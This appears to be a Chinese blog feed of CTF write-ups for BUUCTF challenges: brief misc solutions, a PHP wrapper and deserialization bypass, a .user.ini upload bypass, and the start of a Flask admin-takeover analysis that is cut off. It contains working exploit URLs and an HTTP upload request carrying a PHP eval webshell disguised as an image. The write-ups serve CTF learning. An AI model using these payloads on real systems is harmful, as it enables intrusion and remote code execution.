srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306161014547"></p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306160724238.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306160724238.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306160724238"></p><h3 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h3><p>winhex 打开文件末尾就是flag</p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306162311461.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306162311461.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306162311461"></p><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>archpr破解rar密码</p><p><img src="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306164907154.png" class="lazyload" data-srcset="/2021/03/03/buuctf-misc%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/image-20210306164907154.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210306164907154"></p><h3 id="乌镇各种图"><a href="#乌镇各种图" class="headerlink" title="乌镇各种图"></a>乌镇各种图</h3><p>010eidter打开 末尾就是flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ZJCTF 2019]NiZhuanSiWei</title>
      <link href="2021/02/28/ZJCTF-2019-NiZhuanSiWei/"/>
      <url>2021/02/28/ZJCTF-2019-NiZhuanSiWei/</url>
      
        <content type="html"><![CDATA[<p>一道相对简单的绕过题，主要用到了一些php伪协议</p><span id="more"></span><h3 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h3><p>一些常见的php伪协议</p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>元封装器，设计用于数据流打开时的筛选过滤应用</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure></blockquote><p>可选择采用多种过滤器（字符串/转换/压缩/加密）</p><p>常用payload用于读源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=upload.php</span></span><br></pre></td></tr></table></figure><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p><strong>php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。</strong></p><blockquote><p>allow_url_fopen ：off/on<br>allow_url_include：on</p><p>且enctype=“multipart/from-data” 时 php://input 无效</p></blockquote><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>数据流封装器 data:资源类型;&lt;编码&gt;,内容</p><blockquote><p>allow_url_fopen ：on<br>allow_url_include：on<br>php 版本大于等于 php5.2</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xxx.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure><p>0x02 解题过程wp</p><p>直接源码贴</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123; <span class="comment">#利用data://协议绕过</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//查看useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;8b5645ba-c840-468a-b33c-c48d8810e9b3.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p><img src="/2021/02/28/ZJCTF-2019-NiZhuanSiWei/image-20210303215618817.png" class="lazyload" data-srcset="/2021/02/28/ZJCTF-2019-NiZhuanSiWei/image-20210303215618817.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303215618817"></p><p>伪协议读出 useless的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>于是构造出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;8b5645ba-c840-468a-b33c-c48d8810e9b3.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/02/28/ZJCTF-2019-NiZhuanSiWei/image-20210303220817689.png" class="lazyload" data-srcset="/2021/02/28/ZJCTF-2019-NiZhuanSiWei/image-20210303220817689.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303220817689"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bypass </tag>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[suctf2019]CheckIn</title>
      <link href="2021/02/27/2019-CheckIn/"/>
      <url>2021/02/27/2019-CheckIn/</url>
      
        <content type="html"><![CDATA[<p>利用上传<code>.user.ini</code> 自动文件包含从而绕过一些文件上传利用限制</p><span id="more"></span><h3 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h3><p><code>.user.ini</code>，它比<code>.htaccess</code>用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。</p><h4 id="什么是-user-ini"><a href="#什么是-user-ini" class="headerlink" title="什么是 .user.ini?"></a>什么是 .user.ini?</h4><p>我们知道php.ini是php默认的配置文件，其中包括了很多php的配置，<a href="https://www.php.net/manual/zh/ini.list.php">https://www.php.net/manual/zh/ini.list.php</a></p><p>配置模式定义分为了： PHP_INI_SYSTEM、PHP_MINI_PERDIR、PHP_INI_ALL、PHP_INI_USER</p><p><img src="/2021/02/27/2019-CheckIn/image-20210303205358415.png" class="lazyload" data-srcset="/2021/02/27/2019-CheckIn/image-20210303205358415.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303205358415"></p><p>关于.user.ini文件官方解释为：</p><blockquote><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（[$_SERVER<a href="https://www.php.net/manual/zh/reserved.variables.server.php">‘DOCUMENT_ROOT’]</a> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 <strong><code>PHP_INI_PERDIR</code></strong> 和 <strong><code>PHP_INI_USER</code></strong> 模式的 INI 设置可被识别。</p></blockquote><p><strong>也就是说.user.ini 相当于用户自定义的一个php.ini,但是只能修改可修改范围为 PHP_INI_PERDIR、PHP_INI_USER的配置</strong></p><p>于是我们通过修改一些配置选项，借助.user.ini构造一个后门，我们关注一下php.ini 文档中的<code>auto_append_file、auto_prepend_file</code></p><p><img src="/2021/02/27/2019-CheckIn/image-20210303210401201.png" class="lazyload" data-srcset="/2021/02/27/2019-CheckIn/image-20210303210401201.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303210401201"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file string</span><br><span class="line">Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.</span><br><span class="line"></span><br><span class="line">The special value none disables auto-prepending.</span><br><span class="line"></span><br><span class="line">auto_append_file string</span><br><span class="line">Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.</span><br><span class="line"></span><br><span class="line">The special value none disables auto-appending.</span><br></pre></td></tr></table></figure><p>官方文档解释如上，auto_prepend_file 用于在脚本解析开始处包含文件，auto_append_file 用于在脚本解析最后后包含文件，且如果脚本中含有exit(),则不发生，于是我们可以调此配置包含本不会被解析的图片马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;x.png</span><br></pre></td></tr></table></figure><h3 id="0x02-wp"><a href="#0x02-wp" class="headerlink" title="0x02 wp"></a>0x02 wp</h3><p><img src="/2021/02/27/2019-CheckIn/image-20210303211138367.png" class="lazyload" data-srcset="/2021/02/27/2019-CheckIn/image-20210303211138367.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210303211138367"></p><p>最典型不过的文件包含</p><p>上传.user.ini 后上传webshell即可</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ad475845-4d19-4b6a-add8-d32bfdf8171d.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>352</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://ad475845-4d19-4b6a-add8-d32bfdf8171d.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryo5STsLcEm8W4O0oi</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://ad475845-4d19-4b6a-add8-d32bfdf8171d.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=177f24714762d6-07ad73289ec17-53e356a-144000-177f24714776fd</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryo5STsLcEm8W4O0oi</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;fileUpload&quot;; filename=&quot;x.png&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_GET[M0th]);phpinfo();&lt;/script&gt;</span><br><span class="line">------WebKitFormBoundaryo5STsLcEm8W4O0oi</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload&quot;</span><br><span class="line"></span><br><span class="line">鎻愪氦</span><br><span class="line">------WebKitFormBoundaryo5STsLcEm8W4O0oi--</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HCTF 2018]admin</title>
      <link href="2021/02/24/HCTF-2018-admin/"/>
      <url>2021/02/24/HCTF-2018-admin/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01简单分析题目"><a href="#0x01简单分析题目" class="headerlink" title="0x01简单分析题目"></a>0x01简单分析题目</h3><p>一个登入框，一个注册框</p><p>注册一个test账户进行测试</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302173658163.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302173658163.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302173658163"></p><p>查看源代码发现</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302173738764.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302173738764.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302173738764"></p><p>于是猜测越权漏洞，即登入admin账户，而且登入后多了一些功能</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302174236807.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302174236807.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302174236807"></p><p>在更改密码处 发现了源码地址</p><p><img src="/2021/02/24/HCTF-2018-admin/image-20210302174337771.png" class="lazyload" data-srcset="/2021/02/24/HCTF-2018-admin/image-20210302174337771.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210302174337771"></p><p>于是我们得到了源代码，发现其基于python flask 开发</p><h3 id="0x02-源码分析"><a href="#0x02-源码分析" class="headerlink" title="0x02 源码分析"></a>0x02 源码分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> logout_user, LoginManager, current_user, login_user</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app, db</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> Config</span><br><span class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> forms <span class="keyword">import</span> RegisterForm, LoginForm, NewpasswordForm</span><br><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> code <span class="keyword">import</span> get_verify_code</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/code&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    image, code = get_verify_code()</span><br><span class="line">    <span class="comment"># 图片以二进制形式写入</span></span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    image.save(buf, <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    buf_str = buf.getvalue()</span><br><span class="line">    <span class="comment"># 把buf_str作为response返回前端，并设置首部字段</span></span><br><span class="line">    response = make_response(buf_str)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line">    <span class="comment"># 将验证码字符串储存在session中</span></span><br><span class="line">    session[<span class="string">&#x27;image&#x27;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, title = <span class="string">&#x27;hctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:  <span class="comment">#当前用户存在，重定向到index</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data) <span class="comment">#将username通过strlower函数小写转换至name</span></span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower(): <span class="comment">#从session中取出验证码进行校验</span></span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> 